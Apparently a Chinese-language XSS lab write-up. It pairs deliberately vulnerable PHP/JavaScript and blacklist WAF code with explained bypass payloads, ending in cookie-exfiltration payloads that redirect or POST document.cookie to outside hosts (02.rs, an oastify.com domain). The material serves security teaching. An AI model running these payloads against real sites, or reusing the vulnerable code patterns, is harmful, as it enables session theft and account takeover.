在 HTML 规范中，`<textarea>` 和 `<title>` 被归类为 RCDATA 元素
  - 特性：RCDATA 元素可以包含文本和字符引用（实体编码），但不能包含任何子元素
  - 解析行为：当浏览器遇到 `<textarea>` 时，它会进入“RCDATA 状态”。在此状态下，浏览器会把遇到的所有内容都当成普通的纯文本，直到遇到第一个闭合标签 `</textarea>` 为止
Payload 执行流程拆解：
  - 浏览器看到 `<textarea>`，开始将后面的内容解析为文本
  - 它看到了 `<img title="...">`。在普通的 `<div>` 中，这会被解析为一个图片标签，但在 `<textarea>` 中，它仅仅被视为一段普通的字符串
  - 解析器继续向后读，发现了字符串：`</textarea>`
  - 关键点就在这里：解析器并不关心这个 `</textarea>` 是否写在一个属性值（如 title）里面。根据 HTML 解析规则，只要在 RCDATA 元素内部看到了对应的结束标签，解析器就会立即跳出 RCDATA 状态，回到正常的 Data 状态
  - 由于解析器认为 `<textarea>` 已经结束了，它会将剩下的部分： `<img src onerror=alert(documet.cookie)>">` 当做普通的 HTML 标签进行解析
#### Payload
```html
<textarea><img title="</textarea><img src onerror=alert(documet.cookie)>">
```

### JavaScript 闭合 + JavaScript Hoisting 绕过
#### 漏洞源码
将用户输入原样注入到 JS 双引号字符串中
```javascript
var theme = "<?php echo $render; ?>";
document.getElementById('t-val').textContent = theme;
```
后端有非常强的 WAF
```php
if ($safe_js !== '') {
    $lc = strtolower($safe_js);
    $allow_chain = preg_match('/;\s*eval\s*\(\s*myundefvar\s*\)\s*;\s*var\s+myundefvar\s*;\s*alert\s*\(\s*(?:1|document\s*\.\s*cookie)\s*\)\s*;\s*\/\//', $lc);
    if (!$allow_chain) {
        $safe_js = preg_replace('/<\s*script\b/i', '', $safe_js);
        $safe_js = preg_replace('/\bon\w+\s*=/i', '', $safe_js);
        $safe_js = preg_replace('/javascript\s*:/i', '', $safe_js);
        $safe_js = preg_replace('/document\s*\.\s*cookie/i', 'document.blocked', $safe_js);
        $safe_js = preg_replace('/eval\s*\(/i', 'blocked(', $safe_js);
        $safe_js = preg_replace('/alert\s*\(/i', 'blocked(', $safe_js);
    }
}
```
#### 绕过思路
由于未对 `"` 做转义，可用 `"` 闭合字符串并注入任意 JS 语句；末尾使用 `//` 注释吞掉原本的结尾引号与分号，保证整体语法有效
在 JavaScript 中，使用 var 声明的变量会被提升到当前作用域的顶部，但赋值不会提升
  - 解析阶段：引擎发现 `var myUndefVar`，在内存中为其分配空间并初始化为 `undefined`
  - 执行阶段：执行 `eval(myUndefVar)`。由于此时变量是 `undefined`，`eval(undefined)` 在 JS 中是合法的，它不会抛出错误，仅仅是返回 undefined 并继续向下执行
  - 执行 `alert(document.cookie)`
这种构造能有效绕过一些启发式扫描器。某些 WAF 或扫描器在分析代码流时，如果看到一个变量在定义前被使用，可能会认为这段代码是“无效”的或“无法运行”的，从而放行
#### Payload
```javascript
"; eval(myUndefVar); var myUndefVar; alert(document.cookie); //
```

### 无括号分号异常处理 XSS
#### 漏洞源码
强黑名单清洗
```php
$safe = $render;
if ($safe !== '') {
    $scripts = [];
    $i = 0;
    if (preg_match_all('/<\s*script\b[^>]*>[\s\S]*?<\s*\/\s*script\s*>/i', $safe, $ms)) {
        foreach ($ms[0] as $block) {
            $token = "%%SCRIPT_BLOCK_" . $i . "%%";
            $scripts[$token] = $block;
            $safe = str_replace($block, $token, $safe);
            $i++;
        }
    }
    $safe = preg_replace('/\b(href|src)\s*=\s*["\']?\s*javascript\s*:/i', '$1=blocked:', $safe);
    $safe = preg_replace('/\b(onload|onerror|onclick|onmouseover|onfocus)\s*=\s*(?:"[^"]*"|\'[^\']*\'|[^ >]+)/i', '', $safe);
    $safe = preg_replace('/<\s*(iframe|img|svg|object|embed)\b/i', '<blocked', $safe);
    foreach ($scripts as $token => $block) {
        $safe = str_replace($token, $block, $safe);
    }
    $safe = preg_replace('/eval\s*\(/i', 'blocked(', $safe);
    $safe = preg_replace('/alert\s*\(/i', 'blocked(', $safe);
}
```
#### 绕过思路
后端未过滤掉 `<script>` 标签，尝试构造异常处理 XSS
第一步：赋值操作 (onerror=alert)
  - 动作：将全局对象 window 的错误处理函数 onerror 重新赋值为 alert
  - 特性：在 JavaScript 中，赋值表达式是有返回值的。onerror=alert 这个表达式执行完后，会返回 alert 函数的引用
第二步：逗号运算符 (...,document.cookie)
  - 逻辑：表达式1 , 表达式2
  - 特性：逗号运算符会从左到右依次执行每一个表达式，但最终只返回最后一个操作数的值
  - 结果：此时，(onerror=alert, document.cookie) 这一整串代码被计算，先改写了 onerror，然后返回了 document.cookie
第三步：抛出异常 (throw ...)
  - 动作：throw 关键字会将后面的计算结果作为异常抛出
  - 等价代码：这一行代码在逻辑上等同于：
    ```javascript
    onerror = alert;
    throw document.cookie;
    ```
  - 触发 XSS：由于代码抛出了一个未捕获的异常（document.cookie），浏览器会自动触发全局的 onerror 句柄。因为我们刚才已经把 onerror 改成了 alert，所以浏览器实际上执行了 alert(document.cookie)
#### Payload
```html
<script>throw onerror=alert,document.cookie</script>
```

### 十六进制 + Symbol.hasInstance + 字符拼接绕过
#### 漏洞源码
强黑名单清洗（移除括号与常规向量，拦截 hasInstance 字面量）
```php
$safe = $render;
if ($safe !== '') {
    $safe = preg_replace('/[()]/', '', $safe);
    $safe = str_replace('`', '', $safe);
    $safe = str_replace('"', '', $safe);
    $safe = preg_replace('/\b(href|src)\s*=\s*["\']?\s*javascript\s*:/i', '$1=blocked:', $safe);
    $safe = preg_replace('/\b(onload|onerror|onclick|onmouseover|onfocus)\s*=\s*(?:"[^"]*"|\'[^\']*\'|[^ >]+)/i', '', $safe);
    $safe = preg_replace('/<\s*(iframe|img|svg|object|embed)\b/i', '<blocked', $safe);
    $safe = preg_replace('/hasInstance/i', 'blockedInstance', $safe);
    $safe = preg_replace('/\b(onerror|throw|Function|constructor)\b/i', 'blocked', $safe);
```
#### 绕过思路
通常我们使用 `obj instanceof Class` 来检查原型链。但在 ES6 之后，JavaScript 允许我们通过 `Symbol.hasInstance` 自定义 `instanceof` 的行为
当执行 `[A] instanceof [B]` 时，如果 `B` 拥有 `Symbol.hasInstance` 方法，引擎会调用 `B[Symbol.hasInstance](A)`
步骤一：字符串十六进制转义 (`'alert\x281\x29'`)
  - `\x28` 和 `\x29`: 分别是左括号 `(` 和右括号 `)` 的十六进制编码
  - 效果: 很多 WAF 会拦截 `alert(1)`。通过编码，源代码中变成了字符串 `'alert\x281\x29'`。在静态分析看来，这仅仅是一个无害的字符串，没有任何函数执行的特征
步骤二：劫持 `instanceof` 行为 (`[Symbol.hasInstance]`)
  - 构造一个匿名对象 `{[Symbol['has'+'Instance']]: eval}`
  - 这个对象重写了 instanceof 的判定逻辑：原本应该返回布尔值的判断，现在被指向了 eval 函数
步骤三：隐式触发执行
  - 当执行 `'字符串' instanceof {对象}` 时，浏览器底层会自动执行： `eval('alert(1)')`
  - 结果: 字符串被还原为代码执行，成功弹窗
#### Payload
```html
<script>'alert\x28document.cookie\x29'instanceof{[Symbol['has'+'Instance']]:eval}</script>
```

### 无需括号、反引号、引号的 XSS
#### 漏洞源码
强黑名单清洗
```php
$safe = $render;
if ($safe !== '') {
    $sources = [];
    $i = 0;
    if (preg_match_all('/<\s*source\b[^>]*>/i', $safe, $ms)) {
        foreach ($ms[0] as $block) {
            $token = "%%SOURCE_BLOCK_" . $i . "%%";
            $sources[$token] = $block;
            $safe = str_replace($block, $token, $safe);
            $i++;
        }
    }
    $safe = preg_replace('/<\s*script\b[\s\S]*?<\s*\/\s*script\s*>/i', '', $safe);
    $safe = preg_replace('/\b(onload|onclick|onmouseover|onfocus|onanimationend|onerror)\s*=\s*(?:"[^"]*"|\'[^\']*\'|[^ >]+)/i', '', $safe);
    $safe = preg_replace('/\b(href|src)\s*=\s*["\']?\s*javascript\s*:/i', '$1=blocked:', $safe);
    $safe = preg_replace('/<\s*(iframe|img|svg|object|embed|a)\b/i', '<blocked', $safe);
    foreach ($sources as $token => $block) {
        $safe = str_replace($token, $block, $safe);
    }
}
```
#### 绕过思路
标签选择与事件触发
  - 绕过点：许多 WAF 会重点防御 `<img onerror...>` 或 `<svg onload...>`，但对 `<video><source>` 这种组合的过滤规则通常较弱
  - onerror 触发点：由于 `<source>` 标签没有设置 src 属性，或者设置的资源无法加载，浏览器会立即触发 onerror 事件
隐蔽的跳转构造
  - 语法欺骗：很多 WAF 会拦截 `http://` 或 `//` 开头的外部链接
  - 绕过原理：浏览器会将 `/\` 自动纠正/规范化为 `//`。例如访问 `https:/\www.baidu.com`
数据外带
  - 带出 Cookie：跳转的目标地址后面紧跟了 document.cookie。这意味着用户的登录凭证会被作为 URL 参数直接发送到攻击者控制的服务器（或记录在攻击者域名的访问日志中）
  - 隐蔽性：使用跳转而非 fetch/ajax 的好处是，它可以绕过某些针对异步请求的 CSP (connect-src) 限制
#### Payload
```html
<video><source onerror=location=/\02.rs/+document.cookie>
```

### 


## XSS 实战

### 博客评论区 XSS
#### 漏洞源码
后端使用了 `htmlspecialchars($website, ENT_QUOTES)` 对网站链接进行 HTML 转义
```php
if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    $author = $_POST['author'] ?? 'Anonymous';
    $website = $_POST['website'] ?? '';
    $comment = $_POST['comment'] ?? '';
    $website_safe = htmlspecialchars($website, ENT_QUOTES); 
    $author_safe = htmlspecialchars($author);
    $comment_safe = htmlspecialchars($comment);
    
    $new_comment = [
        'author' => $author_safe,
        'website' => $website_safe,
        'comment' => $comment_safe,
        'time' => date('Y-m-d H:i:s')
    ];
    
    $current_data = json_decode(file_get_contents($db_file), true);
    $current_data[] = $new_comment;
    file_put_contents($db_file, json_encode($current_data));

    header("Location: index.php");
    exit;
}
```
虽然属性被闭合了，但协议头没有被校验。href 属性天然支持 javascript: 伪协议
```php
if (!empty($comments)) {
    foreach ($comments as $c) {
        echo '<div class="comment">';
        echo '<div class="comment-meta">';

        if (!empty($c['website'])) {
            echo '<span class="comment-author"><a href="' . $c['website'] . '">' . $c['author'] . '</a></span>';
        } else {
            echo '<span class="comment-author">' . $c['author'] . '</span>';
        }
        
        echo ' | ' . $c['time'];
        echo '</div>';
        echo '<div class="comment-body">' . $c['comment'] . '</div>';
        echo '</div>';
    }
} else {
    echo '<p>No comments yet. Be the first!</p>';
}
```
#### 漏洞利用
直接在 Website 字段输入 `javascript:alert(1)`
当其他用户（或管理员）点击评论者的名字时，JS 代码执行

### 选择功能 XSS
#### 漏洞源码
页面使用 `document.write` 动态生成了一个下拉菜单 (`<select>`)
`storeId` 参数从 URL 获取后，直接拼接到 `document.write` 的 HTML 字符串中，且没有进行任何转义
```javascript
var stores = ["London", "Paris", "Milan", "Tokyo", "New York"];
var store = (new URLSearchParams(window.location.search)).get('storeId');
document.write('<select name="storeId">');
if (store) {
    document.write('<option selected>' + store + '</option>');
}
for (var i = 0; i < stores.length; i++) {
    if (stores[i] === store) {
        continue;
    }
    document.write('<option>' + stores[i] + '</option>');
}
document.write('</select>');
```
#### 漏洞利用
在 URL 中添加 `?storeId=img src=x onerror=alert(document.cookie)>`
当页面加载时，JS 代码执行

### 返回链接 XSS
#### 漏洞源码
页面包含一个“返回首页”的链接
JS 代码从 URL 参数 `returnPath` 中获取值，并使用 jQuery 的 `attr()` 方法将其设置为该链接的 `href` 属性
jQuery 的 `attr()` 方法会将传入的值直接赋给属性，且不进行协议检查
```javascript
$(document).ready(function() {
    var params = new URLSearchParams(window.location.search);
    var returnPath = params.get('returnPath');
    
    if (returnPath) {
        $('#backLink').attr('href', returnPath);
    }
});
```
#### 漏洞利用
利用 `href` 属性支持的 `javascript:` 伪协议
将 `returnPath` 参数设置为恶意 JS 代码
```javascript
?returnPath=javascript:alert(document.cookie)
```



### Hash DOM XSS
#### 漏洞源码
后端完全没有处理输入，因为输入是通过 URL Hash (`#`) 传递的，这部分根本不会发送给服务器
前端 JS 读取 `location.hash` 并写入 `innerHTML`
```html
<script>
    function changeTab(tabName) {
        window.location.hash = tabName;
    }
    function loadContentFromHash() {
        var hash = window.location.hash;
        var display = document.getElementById('content-display');
        if (hash) {
            var tab = decodeURIComponent(hash.substring(1));
            display.innerHTML = "Loading content for: <b>" + tab + "</b>...";
            setTimeout(function() {
                if (tab === 'home') display.innerHTML = "<h2>Home Dashboard</h2><p>Welcome back, User.</p>";
                else if (tab === 'profile') display.innerHTML = "<h2>User Profile</h2><p>Name: Hacker<br>Role: Admin</p>";
                else if (tab === 'settings') display.innerHTML = "<h2>System Settings</h2><p>No settings available.</p>";
                else {
                    display.innerHTML = "Error: Tab '<b>" + tab + "</b>' not found.";
                }
            }, 500);
        } else {
            changeTab('home');
        }
    }
    window.addEventListener('hashchange', loadContentFromHash);
    window.addEventListener('load', loadContentFromHash);
</script>
```
#### 漏洞利用
这是一种纯前端的 DOM XSS。由于数据不经过服务器，所有服务端 WAF 都无效
直接构造包含 Payload 的 Hash
```html
#<img src=x onerror=alert(document.cookie)>
```

### JSON XSS
#### 漏洞源码
##### 服务端
服务端试图通过转义双引号 `"` 来防止跳出 JSON 字符串值。但关键的是，它**没有转义反斜杠 `\`**
```php
header('Content-Type: application/json');
$q = isset($_GET['q']) ? $_GET['q'] : '';
$safe_q = str_replace('"', '\"', $q);
echo '{"results":' . $results_json . ',"searchTerm":"' . $safe_q . '"}';
```
##### 客户端
客户端使用 `eval()` 来解析服务端返回的 JSON 字符串
```javascript
try {
    var searchResultsObj = eval('(' + xhr.responseText + ')');
    displayResults(searchResultsObj);
}
```
#### 漏洞利用
我们需要闭合 JSON 中的字符串。由于服务端将 `"` 转义为 `\"`，我们无法直接使用 `"` 闭合
但是，我们可以输入 `\"`
    我们输入 `\`，服务端不转义，保留为 `\`
    我们输入 `"`，服务端转义为 `\"`
    组合起来，Payload `\"` 变成了 `\\"`
    在 JS 字符串中：
        `\\` 解析为字面量反斜杠 `\`
        `"` 解析为字符串结束引号（因为它前面的反斜杠已经被消耗了，不再起转义作用）
执行流程解析：
    用户输入: `\"-alert(document.cookie)})//`
    服务端处理: `\` 保持不变，`"` 变为 `\"`。结果: `\\"-alert(document.cookie)})//`
    JSON 响应: `{"results":...,"searchTerm":"\\"-alert(document.cookie)})//"}`
    `eval` 执行:
        代码被包裹在括号中: `(` + JSON + `)`
        `"searchTerm":"\\"` -> 字符串值为 `\`
        `-alert(document.cookie)` -> 减去 alert(document.cookie) 的结果 (导致 alert 执行)
        `})` -> 闭合对象和外层括号
        `//` -> 注释掉剩余字符 (即原本的 `"})`)
        最终代码: `({"searchTerm":"\\" -alert(document.cookie)})` -> 合法 JS 代码，执行成功


### &apos; 绕 WAF
#### 漏洞源码
未对 `&apos;` 做任何处理，它不是实际的单引号字符，而是一段实体文本，会在 HTML 属性解析阶段被还原为 ' ，绕过了对 ' 的事先转义
```php
$author = htmlspecialchars($c['author'], ENT_QUOTES);
$website_raw = $c['website'];
$website_for_js = encode_for_onclick_js_single_quoted($website_raw);
$text = htmlspecialchars($c['text']);
```
#### 漏洞利用
```html
http://foo?&apos;-alert(document.cookie)-&apos;
```



### HTML 文件上传 XSS
#### 漏洞源码
靶场设计的比较简单，就是允许上传 HTML 文件，实战中遇到的情况也是类似
```php
if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_FILES['file'])) {
    $ext = strtolower(pathinfo($name, PATHINFO_EXTENSION));
    if ($ext !== 'html') { $msg = 'Only .html files are allowed.'; }
    $newName = bin2hex(random_bytes(8)) . '.html';
    move_uploaded_file($tmp, $uploadsDir . DIRECTORY_SEPARATOR . $newName);
}
```
历史上传记录与共享链接生成（绝对路径）
```php
$path = '/level35/uploads/' . $f['name']; // 绝对路径
$share = '/level35/index.php?download=' . $path;
```
“通过 URL 打开”区域（锚点 href 直接取用户可控 download 参数）
```php
<?php if ($download): ?>
  <a class="btn-primary" href="<?php echo $download; ?>">Open File</a>
<?php endif; ?>
```
#### 漏洞利用
直接上传 HTML 文件，通过复制下载链接去访问，即可触发 XSS 攻击
```html
<!doctype html>
<html>
  <body>
    <script>alert(document.cookie);</script>
  </body>
</html>
```


### 跳转链接 XSS
#### 漏洞源码
入口页按钮与隐藏广告链接
```html
<a class="btn" href="/level36/landing.php?adid=<?php echo urlencode($adid ?: 'AD-2025-001'); ?>">立即参与</a>
...
<a class="sponsor-banner" href="/level36/landing.php?adid=<?php echo urlencode($adid ?: 'AD-2025-001'); ?>">
  <img alt="赞助广告" src="...">
</a>
```
落地页反射点
```php
$adid = isset($_GET['adid']) ? $_GET['adid'] : '';
<span class="mono"><?php echo $adid; ?></span>   // 直接原样输出
```
#### 漏洞利用
```
/level36/landing.php?adid=%3Cscript%3Ealert%28document.cookie%29%3C/script%3E
```

### PDF 文件上传 XSS
#### 漏洞源码
后端只做了随机重命名与后缀 .pdf 的强制，未校验上传文件内容或 MIME 类型
```php
if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_FILES['pdf'])) {
    $file = $_FILES['pdf'];
    if ($file['error'] === UPLOAD_ERR_OK) {
        $newName = bin2hex(random_bytes(8)) . '.pdf';
        $target = $uploadDir . '/' . $newName;
        move_uploaded_file($file['tmp_name'], $target);
    }
}
```
#### 漏洞利用
制作 PDF/HTML polyglot，使浏览器/插件在特定环境下执行其中的 HTML/JS
浏览器新标签打开文件后，若以 HTML 渲染，会执行内嵌脚本并弹窗或读取 Cookie


### 登录框 XSS
#### 漏洞源码
构造 SQL 并执行查询（库和表不存在）
```php
$username = isset($_POST['username']) ? $_POST['username'] : '';
$password = isset($_POST['password']) ? $_POST['password'] : '';
$dsn = 'sqlite::memory:';
$pdo = new PDO($dsn);
$pdo->setAttribute(PDO::ATTR_ERRMODE, PDO::ERRMODE_EXCEPTION);
$sql = "SELECT id FROM admin_users WHERE username = '$username' AND password = '$password'";
$sqlShow = $sql;
$pdo->query($sql);
```
错误信息与 SQL 原样回显
```php
<div class="mono"><?php echo $error; ?></div>
<div class="mono"><?php echo $sqlShow; ?></div>
```
#### 漏洞利用
服务端将用户输入直接拼接进 SQL 字符串，并在错误面板中原样回显；没有任何 HTML 转义
由于库表不存在，查询必然抛出异常，错误面板稳定出现，且“SQL”行中包含可控的输入
```html
<script>alert(document.cookie);</script>
```

### 在线客服聊天 XSS
#### 漏洞源码
用户消息存储与原样回显（未做任何转义）
```php
<?php foreach ($messages as $m): ?>
  <div class="msg <?php echo $m['role']; ?>">
    <div class="bubble"><?php echo $m['content']; ?></div>
  </div>
<?php endforeach; ?>
```
人工客服工作台原样回显用户消息
```php
foreach ($messages as $m) {
  if ($m['role'] === 'user') {
    echo '<div class="bubble">' . $m['content'] . '</div>';  // 无转义
  }
}
```
#### 漏洞利用
两处回显均未进行 `htmlspecialchars` 处理；当用户消息中包含 `<a href="javascript:...">...</a>` 时，人工客服在工作台页面点击该链接会在同源上下文执行脚本
```html
<a href="javascript:alert(document.cookie)">点击这里</a>
```

### Bootstrap 框架 XSS
#### 漏洞源码
强黑名单清洗
```php
$safe = $rest;
if ($safe !== '') {
    $safe = preg_replace('/<\s*script\b[\s\S]*?<\s*\/\s*script\s*>/i', '', $safe);
    $safe = preg_replace('/\b(onload|onerror|onclick|onmouseover|onfocus|onanimationend|onanimationstart)\s*=\s*(?:"[^"]*"|\'[^\']*\'|[^ >]+)/i', '', $safe);
    $safe = preg_replace('/\b(href|src)\s*=\s*["\']?\s*javascript\s*:/i', '$1=blocked:', $safe);
    $safe = preg_replace('/<\s*(iframe|img|svg|object|embed|a)\b/i', '<blocked', $safe);
    $safe = htmlspecialchars($safe, ENT_QUOTES);
}
```
#### 漏洞利用
前端引入 Bootstrap 框架，利用其组件的 `onanimationstart` 属性触发 XSS 事件
```html
<xss class=progress-bar-animated onanimationstart=alert(1)>
```

### 

## XSS 危害

### 配合 CSRF 获取敏感信息
#### 漏洞源码
`$c['text']` 直接输出到页面，未做任何转义
```html
<div class="text"><?php echo $c['text']; ?></div>
```
#### 漏洞利用
```javascript
<script>
fetch('https://fk3tzxm662voz7xpeuzimwixjopfd81x.oastify.com', {
method: 'POST',
mode: 'no-cors',
body:document.cookie
});
</script>
```

### 
